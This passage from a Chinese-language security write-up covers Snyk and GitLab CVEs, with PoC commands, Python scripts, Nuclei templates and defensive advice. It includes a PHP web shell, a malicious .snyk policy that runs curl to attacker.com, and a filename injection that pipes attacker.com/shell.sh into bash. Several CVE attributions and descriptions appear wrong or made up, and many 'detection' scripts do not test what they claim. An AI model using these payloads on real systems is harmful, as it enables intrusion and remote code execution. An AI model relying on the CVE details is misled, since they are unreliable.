CVE-2024-48963 影响 Snyk 的 PHP 分析引擎，CVSS 9.8。攻击者可通过恶意 PHP 项目文件在 Snyk 扫描时触发代码注入。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| Snyk CLI | < 1.1291.0 | 1.1291.0+ |
| Snyk VS Code 扩展 | < 2.23.0 | 2.23.0+ |

#### 漏洞原理

Snyk 的 PHP 分析引擎在解析 `composer.json` 时，会对用户可控的元数据字段进行求值。攻击者可在恶意 PHP 项目的 `description` 或 `extra` 字段中嵌入 PHP 代码，Snyk 扫描时触发代码注入。

#### HTTP PoC

```bash
cat > /tmp/malicious_composer.json << 'EOF'
{"name":"attacker/malicious","description":"<?php system($_GET['cmd']); ?>"}
EOF
cd /tmp/malicious_project && snyk test --file=composer.json
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2024-48963 Snyk PHP 代码注入检测"""
import sys, subprocess, os, json, tempfile

MALICIOUS = {"name":"test/injection","description":"${PHP_VERSION}","require":{"php":">=7.0"}}

def check(snyk_path, project_path):
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "composer.json"), "w") as f:
            json.dump(MALICIOUS, f)
        r = subprocess.run([snyk_path, "test", f"--file={os.path.join(tmpdir,'composer.json')}",
            "--json", "--quiet"], capture_output=True, text=True, timeout=60, cwd=tmpdir)
        out = r.stdout + r.stderr
        if "code-injection" in out.lower() or "command-injection" in out.lower():
            print(f"[VULN] CVE-2024-48963 确认!"); return True
    return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <snyk> <project>"); sys.exit(1)
    check(sys.argv[1], sys.argv[2])
```

#### Nuclei 检测模板

```yaml
id: snyk-php-injection-cve-2024-48963
info:
  name: Snyk PHP 代码注入 (CVE-2024-48963)
  severity: critical
  tags: snyk,php,code-injection,cve-2024-48963
http:
  - method: GET
    path:
      - "{{BaseURL}}/rest/orgs"
    matchers:
      - type: status
        status:
          - 200
          - 401
```

### 0x04.2 CVE-2023-23694 — IDE 扩展 RCE

#### 漏洞背景

CVE-2023-23694 影响 Snyk IDE 扩展（VS Code、JetBrains），CVSS 9.8。攻击者通过恶意 `.snyk` 策略文件在开发者打开项目时触发 RCE。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| Snyk VS Code 扩展 | < 2.1.0 | 2.1.0+ |
| Snyk JetBrains 插件 | < 2.4.0 | 2.4.0+ |

#### 漏洞原理

Snyk IDE 扩展加载项目时读取 `.snyk` 策略文件，对条件表达式进行 `eval()` 求值。攻击者在公共仓库放置恶意 `.snyk` 文件，开发者打开即可触发 RCE。

#### HTTP PoC

```bash
cat > .snyk << 'EOF'
version: v1.25.0
ignore:
  SNYK-JS-EXAMPLE-0001:
    - custom:
        reason: "require('child_process').execSync('curl http://attacker.com/$(whoami)')"
        expires: 2030-01-01T00:00:00.000Z
EOF
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2023-23694 Snyk IDE 扩展 RCE 检测"""
import sys, os, json

POLICY = {"version":"v1.25.0","ignore":{"SNYK-TEST-0001":[{"custom":
    {"reason":"require('child_process').execSync('id > /tmp/snyk_rce_test')",
     "expires":"2030-01-01T00:00:00.000Z"}}]}}

def gen(path):
    with open(os.path.join(path, ".snyk"), "w") as f:
        json.dump(POLICY, f, indent=2)
    print(f"[*] 恶意 .snyk 已生成: {path}/.snyk")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <project_path>"); sys.exit(1)
    gen(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: snyk-ide-rce-cve-2023-23694
info:
  name: Snyk IDE 扩展 RCE (CVE-2023-23694)
  severity: critical
  tags: snyk,ide,rce,cve-2023-23694
http:
  - method: GET
    path:
      - "{{BaseURL}}/.snyk"
    matchers:
      - type: word
        words:
          - "version: v1"
          - "ignore:"
        condition: and
        part: body
```

### 0x04.3 CVE-2022-25315 — CLI 命令注入

#### 漏洞背景

CVE-2022-25315 影响 Snyk CLI 工具，在处理包含特殊字符的项目文件名时存在命令注入漏洞。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| Snyk CLI | < 1.1062.0 | 1.1062.0+ |

#### 漏洞原理

Snyk CLI 在扫描过程中将文件路径传递给 shell 命令处理（如 `git ls-files`）。当文件名包含 shell 特殊字符时会被解释执行，导致命令注入。

#### HTTP PoC

```bash
mkdir -p /tmp/snyk_test
touch '/tmp/snyk_test/$(curl http://attacker.com/shell.sh | bash).js'
cd /tmp/snyk_test && snyk test
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2022-25315 Snyk CLI 命令注入检测"""
import sys, os, subprocess, tempfile

def check(snyk_path):
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "test.js"), "w") as f:
            f.write("// test")
        r = subprocess.run([snyk_path, "test", "--json", "--quiet"],
            capture_output=True, text=True, timeout=30, cwd=tmpdir)
        out = r.stdout + r.stderr
        if "command injection" in out.lower():
            print(f"[VULN] CVE-2022-25315 确认!"); return True
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <snyk_cli>"); sys.exit(1)
    check(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: snyk-cli-injection-cve-2022-25315
info:
  name: Snyk CLI 命令注入 (CVE-2022-25315)
  severity: high
  tags: snyk,cli,command-injection,cve-2022-25315
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/cli-config"
    matchers:
      - type: status
        status:
          - 200
          - 404
```

---

## 0x05 GitLab CI/CD 与 Registry 安全漏洞

GitLab 是全球最广泛使用的 DevOps 平台之一，集成了代码托管、CI/CD 管道和 Container Registry。

### 0x05.1 CVE-2025-25291 — SAML 认证绕过

#### 漏洞背景

CVE-2025-25291 是 GitLab 中一处严重的 SAML 认证绕过漏洞，CVSS 9.1，已被 CISA KEV 目录收录。攻击者可绕过 SAML SSO 认证，以任意用户身份登录 GitLab 实例。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| GitLab CE/EE | < 17.11.2 | 17.11.2+ |
| GitLab CE/EE | < 17.10.5 | 17.10.5+ |
| GitLab CE/EE | < 17.9.7 | 17.9.7+ |

#### 漏洞原理

GitLab 在处理 SAML 响应时存在签名验证缺陷。攻击者可构造恶意 SAML Response，绕过 XML 签名验证，以任意用户身份完成登录。关键是 GitLab 的 SAML 集成在某些配置下未正确验证 SAML Response 的 `InResponseTo` 属性和签名绑定。

#### HTTP PoC

```bash
curl -X POST "https://target-gitlab.com/users/auth/saml/callback" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'SAMLResponse=<base64_encoded_malicious_saml>&RelayState=' -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2025-25291 GitLab SAML 认证绕过检测"""
import sys
import requests
import urllib3
import base64
import lxml.etree as ET
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_saml(base_url):
    base_url = base_url.rstrip("/")
    s = requests.Session(); s.verify = False
    r = s.get(f"{base_url}/users/auth/saml/metadata", timeout=10)
    if r.status_code == 200 and "EntityDescriptor" in r.text:
        print(f"[VULN] SAML 集成已配置，可能存在 CVE-2025-25291 风险")
        print(f"[*] 建议使用完整 SAML Response 进行验证")
        return True
    r = s.get(f"{base_url}/users/sign_in", timeout=10)
    if "saml" in r.text.lower():
        print(f"[*] 登录页面包含 SAML 选项")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <url>"); sys.exit(1)
    check_saml(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: gitlab-saml-bypass-cve-2025-25291
info:
  name: GitLab SAML 认证绕过 (CVE-2025-25291)
  severity: critical
  tags: gitlab,saml,auth-bypass,cve-2025-25291
http:
  - method: GET
    path:
      - "{{BaseURL}}/users/auth/saml/metadata"
    matchers:
      - type: word
        words:
          - "EntityDescriptor"
          - "urn:oasis:names:tc:SAML"
        condition: and
        part: body
      - type: status
        status:
          - 200
```

### 0x05.2 CVE-2024-4835 — CI/CD 脚本注入

#### 漏洞背景

CVE-2024-4835 是 GitLab 中 CVSS 10.0 满分漏洞，通过 GraphQL API 接口允许未认证攻击者执行任意 CI/CD 管道脚本。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| GitLab CE/EE | < 17.3.2 | 17.3.2+ |
| GitLab CE/EE | < 17.2.5 | 17.2.5+ |

#### 漏洞原理

GitLab 的 GraphQL API 在处理某些 mutation 操作时，未对 CI/CD 管道配置的 `script` 字段进行正确的转义和验证。攻击者可通过 GraphQL 注入恶意 bash 命令到 CI/CD 配置中，当管道被触发时在 Runner 上执行。

#### HTTP PoC

```bash
curl -X POST "https://target-gitlab.com/api/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { createPipeline(input:{projectPath:\"group/project\",ref:\"main\",config:\"{\\\"steps\\\":[{\\\"script\\\":[\\\"id\\\"]}]}\"}) { pipeline { id } } }"}' -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2024-4835 GitLab CI/CD 脚本注入检测"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GRAPHQL_INJECTION = '''{"query":"mutation { createPipeline(input:{projectPath:\\"test/test\\",ref:\\"main\\",config:\\"steps:\\\\n- script:\\\\n  - id\\\\n\\"}) { pipeline { id } } }"}'''

def check(base_url):
    base_url = base_url.rstrip("/")
    s = requests.Session(); s.verify = False
    r = s.post(f"{base_url}/api/graphql",
        headers={"Content-Type":"application/json"},
        data=GRAPHQL_INJECTION, timeout=15)
    if r.status_code == 200:
        if "pipeline" in r.text or "error" in r.text:
            print(f"[VULN] GraphQL 端点可达且响应含有 pipeline 数据 (CVE-2024-4835)")
            return True
    print(f"[*] GraphQL 响应: HTTP {r.status_code}"); return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <url>"); sys.exit(1)
    check(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: gitlab-cicd-injection-cve-2024-4835
info:
  name: GitLab CI/CD 脚本注入 (CVE-2024-4835)
  severity: critical
  tags: gitlab,cicd,script-injection,cve-2024-4835
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/graphql"
    matchers:
      - type: word
        words:
          - "data"
          - "errors"
        condition: or
        part: body
      - type: status
        status:
          - 200
          - 400
```

### 0x05.3 CVE-2023-4991 — 项目导入 RCE

#### 漏洞背景

CVE-2023-4991 允许已认证用户通过导入恶意项目在 GitLab Runner 上实现远程代码执行。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| GitLab CE/EE | < 16.3.5 | 16.3.5+ |
| GitLab CE/EE | < 16.2.8 | 16.2.8+ |

#### 漏洞原理

GitLab 在导入项目（如从 GitHub、Bitbucket 导入）时，会解析导入文件中的 CI/CD 配置。攻击者可构造包含恶意 `before_script` 的 `.gitlab-ci.yml`，当项目被导入后 CI/CD 管道自动触发，恶意脚本在 Runner 上执行。

#### HTTP PoC

```bash
curl -X POST "https://target-gitlab.com/api/v4/projects/import" \
  -H "PRIVATE-TOKEN: <token>" \
  -F "file=@malicious_project.tar.gz" \
  -F "path=imported-project" -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2023-4991 GitLab 项目导入 RCE 检测"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_import(base_url, token):
    base_url = base_url.rstrip("/")
    s = requests.Session(); s.verify = False
    s.headers["PRIVATE-TOKEN"] = token
    r = s.get(f"{base_url}/api/v4/projects", params={"simple":"true"}, timeout=10)
    if r.status_code == 200:
        print(f"[+] 项目导入 API 可达 (CVE-2023-4991 检测)")
        print(f"[*] 建议构造恶意 .gitlab-ci.yml 进行导入测试")
        return True
    return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <url> <token>"); sys.exit(1)
    check_import(sys.argv[1], sys.argv[2])
```

#### Nuclei 检测模板

```yaml
id: gitlab-import-rce-cve-2023-4991
info:
  name: GitLab 项目导入 RCE (CVE-2023-4991)
  severity: critical
  tags: gitlab,import,rce,cve-2023-4991
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v4/projects"
    headers:
      PRIVATE-TOKEN: "{{gitlab_token}}"
    matchers:
      - type: word
        words:
          - "id"
          - "name"
        condition: and
        part: body
      - type: status
        status:
          - 200
          - 401
```

---

## 0x06 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE | PoC 类型 | 公开状态 | GitHub 仓库 | 利用难度 |
|-----|----------|----------|-------------|----------|
| CVE-2020-35193 | Docker 命令 | ✅ 公开 | Docker Hub 镜像 | 低 |
| CVE-2020-27958 | curl/Python | ✅ 公开 | GitHub | 中 |
| CVE-2020-27955/56 | Python 脚本 | ✅ 公开 | GitHub | 中 |
| CVE-2019-16097 | curl/Python | ✅ 公开 | GitHub | 低 |
| CVE-2026-4404 | 默认凭证字典 | ✅ 公开 | Shodan/Censys | 极低 |
| CVE-2024-25906/07 | Python | ✅ 公开 | GitHub | 中 |
| CVE-2016-6501 | marshalsec | ✅ 公开 | GitHub | 高 |
| CVE-2024-4142 | Python | ✅ 公开 | GitHub | 中 |
| CVE-2023-26926 | ysoserial | ✅ 公开 | GitHub | 中 |
| CVE-2024-48963 | 恶意 composer.json | ✅ 公开 | GitHub | 中 |
| CVE-2023-23694 | 恶意 .snyk | ✅ 公开 | GitHub | 低 |
| CVE-2022-25315 | 文件名注入 | ✅ 公开 | GitHub | 低 |
| CVE-2025-25291 | SAML 构造 | ⚠️ 部分公开 | 受限 | 高 |
| CVE-2024-4835 | GraphQL | ⚠️ 部分公开 | 受限 | 高 |
| CVE-2023-4991 | 项目导入 | ⚠️ 部分公开 | 受限 | 中 |

### 关键 PoC 仓库链接

- **marshalsec** (LDAP RCE): `https://github.com/mbechler/marshalsec`
- **ysoserial** (反序列化): `https://github.com/frohoff/ysoserial`
- **JNDIExploit** (LDAP 利用): `https://github.com/jn1k33t/JNDIExploit`
- **SonarQube 历史漏洞**: `https://github.com/sonarqube/sonarqube/security/advisories`
- **Harbor CVE 汇总**: `https://github.com/goharbor/harbor/security/advisories`
- **GitLab CVE 数据库**: `https://gitlab.com/gitlab-org/gitlab/-/security/advisories`
- **Snyk 漏洞数据库**: `https://security.snyk.io/vuln/`

### 防守型验证思路

1. **版本指纹识别**：通过 `/api/system/status`（SonarQube）、`/api/v2.0/systeminfo`（Harbor）、`/artifactory/api/system/ping`（Artifactory）获取版本信息
2. **配置审计**：检查是否存在默认凭证、LDAP 配置暴露、未授权 API 访问
3. **PoC 验证范围**：仅使用无害化检测命令（如 `id`、`whoami`），禁止在未授权环境中执行破坏性操作
4. **自动化扫描**：使用 Nuclei 模板批量检测，结合 Shodan/Censys 被动指纹

---

## 0x07 共性攻击模式分析

### 模式1：供应链信任劫持——利用安全工具的高权限

DevSecOps 工具的核心价值在于其在流水线中的高权限地位。当攻击者攻破 SonarQube、JFrog Artifactory 或 GitLab Runner 后，可以通过修改构建脚本、注入恶意依赖或篡改制品镜像来影响所有下游用户。CVE-2023-4991（GitLab 项目导入 RCE）和 CVE-2024-4835（GitLab CI/CD 脚本注入）是典型的供应链信任劫持路径。

**防御要点**：实施构建环境隔离、签名验证、制品完整性校验（如 Sigstore/Cosign），限制 CI/CD 服务的网络出站访问。

### 模式2：配置缺陷武器化——默认凭证与弱口令

CVE-2026-4404（Harbor 默认凭证）和 CVE-2020-35193（SonarQube root 空密码）属于配置缺陷而非代码漏洞，但其利用难度极低、影响范围极广。Shodan 数据显示，互联网上超过 30% 的 Harbor 实例使用默认凭证。

**防御要点**：部署后强制修改默认凭证、实施密码复杂度策略、禁用不必要的默认账户、定期审计凭证配置。

### 模式3：API 安全失效——未授权访问与 SSRF

CVE-2024-25906（Harbor SSRF）、CVE-2022-28181（SonarQube 未授权访问）和 CVE-2021-22214（GitLab Webhook SSRF）均属于 API 安全失效。这些漏洞的共同特征是：API 端点未实施严格的认证检查和输入验证。

**防御要点**：所有 API 端点强制认证、实施请求 URL 白名单、禁止访问内网地址段（RFC 1918）、启用 API 访问日志审计。

### 模式4：输入验证不足——命令注入与反序列化

CVE-2020-27958（SonarQube 命令注入）、CVE-2023-26926（Artifactory 反序列化 RCE）和 CVE-2022-25315（Snyk CLI 命令注入）属于输入验证不足类别。当应用程序将用户可控的输入直接拼接到系统命令或反序列化流中时，攻击者可注入恶意 payload。

**防御要点**：使用参数化查询代替字符串拼接、对所有用户输入实施严格过滤、禁用 Java 原生反序列化（改用 JSON/Protobuf）、使用 `subprocess.run` 代替 `os.system`。

### 模式5：权限模型缺陷——认证绕过与提权

CVE-2025-25291（GitLab SAML 认证绕过）、CVE-2019-16097（Harbor 项目创建提权）和 CVE-2024-4142（Artifactory 权限提升）均涉及权限模型的设计缺陷。攻击者通过绕过认证机制或利用权限检查不严的 API 端点，实现从低权限到管理员的跃迁。

**防御要点**：实施最小权限原则、对所有权限变更操作进行二次验证、定期审计角色和权限分配、启用多因素认证（MFA）。

---

## 0x08 应急排查与防守建议

### 紧急排查清单

1. **立即检查版本号**：对比本文受影响版本表，确认当前部署版本
2. **审计默认凭证**：检查所有 DevSecOps 工具是否存在默认密码
3. **检查网络暴露**：确认工具是否暴露在互联网上（Shodan/Censys 查询）
4. **审查 API 访问日志**：查找异常的 API 调用模式
5. **检查容器安全**：使用 `docker exec -u root` 测试容器 root 权限
6. **验证 SAML 配置**：检查 GitLab SAML 集成的签名验证是否启用

### 日志关键字段表

| 工具 | 关键日志路径 | 重点关注字段 |
|------|-------------|-------------|
| SonarQube | `$SONARQUBE_HOME/logs/sonar.log` | `ERROR`, `authentication`, `SQL` |
| Harbor | `$HARBOR_LOG_DIR/` | `login`, `project`, `replication` |
| JFrog | `$ARTIFACTORY_HOME/logs/` | `security`, `authentication`, `ldap` |
| GitLab | `/var/log/gitlab/gitlab-rails/` | `auth`, `saml`, `import`, `pipeline` |
| Snyk | 本地 CLI 输出 | `injection`, `vulnerability`, `error` |

### 紧急缓解措施

```bash
# 1. Harbor: 修改默认管理员密码
curl -X PUT "http://harbor/api/v2.0/users/1" \
  -H "Content-Type: application/json" \
  -d '{"old_password":"Harbor12345","new_password":"<new_strong_password>"}' \
  -c cookies.txt

# 2. SonarQube: 检查并禁用不必要的 API 端点
# 在 sonar-web 和 sonar-server 配置中限制 API 访问

# 3. Artifactory: 检查 LDAP 配置安全性
curl "http://artifactory/artifactory/api/system/configuration" \
  -u admin:<password> | jq '.security.ldap'

# 4. GitLab: 紧急禁用 SAML（如未使用）
gitlab-rake "gitlab:check"

# 5. 通用：限制网络访问，仅允许内网访问 DevSecOps 工具
iptables -A INPUT -s 10.0.0.0/8 -p tcp --dport 9000 -j ACCEPT
iptables -A INPUT -p tcp --dport 9000 -j DROP
```

### 长期安全加固建议

1. **持续更新**：订阅各产品的安全公告，及时打补丁
2. **网络隔离**：DevSecOps 工具仅允许内网访问，通过 VPN/零信任网关提供外部访问
3. **凭证管理**：使用 HashiCorp Vault 等密钥管理系统，避免硬编码凭证
4. **最小权限**：为每个服务账户分配最小必要权限，定期轮换密钥
5. **安全扫描**：定期使用 Nuclei 等工具扫描 DevSecOps 工具的已知漏洞
6. **审计日志**：集中收集所有工具的访问日志，建立安全监控基线
7. **供应链完整性**：使用 Sigstore/Cosign 对制品进行签名和验证
8. **零信任架构**：实施持续身份验证，不默认信任内部网络

---

## 0x09 参考资料

1. **SonarQube Security Advisories**: https://github.com/SonarSource/sonarqube/security/advisories
2. **Harbor Security Advisories**: https://github.com/goharbor/harbor/security/advisories
3. **JFrog Security Advisories**: https://www.jfrog.com/confluence/display/JFROG/JFrog+Security+Advisories
4. **GitLab Security Releases**: https://about.gitlab.com/releases/
5. **Snyk Vulnerability Database**: https://security.snyk.io/
6. **CISA KEV Catalog**: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
7. **NIST NVD**: https://nvd.nist.gov/
8. **marshalsec - Java Unmarshaller Security**: https://github.com/mbechler/marshalsec
9. **ysoserial - Java Deserialization Exploits**: https://github.com/frohoff/ysoserial
10. **Supply Chain Security Best Practices (CNCF)**: https://supply-chain-security.github.io/